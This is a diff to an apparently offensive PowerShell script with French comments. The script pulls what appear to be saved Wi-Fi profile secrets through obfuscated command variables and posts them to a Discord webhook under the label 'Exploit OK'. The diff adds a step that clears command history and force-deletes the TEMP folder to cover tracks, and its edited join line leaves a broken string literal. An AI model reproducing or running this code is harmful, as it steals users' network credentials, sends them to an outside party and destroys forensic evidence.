@@ -22,6 +22,9 @@ $res = (& $n $w show $p) | Select-String "\:(.+)$" | %{
 }
 
 # --- ENVOI DISCORD (Syntaxe simplifiée sans accents graves) ---
-$flatList = $res -join "\n"
+$flatList = $res -join "\"
 $payload = @{ content = "Exploit OK\$flatList" }
 Invoke-RestMethod -Uri $hook -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
+
+#------Nettoyage des fichiers------
+Clear-History; Remove-Item -Path $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue
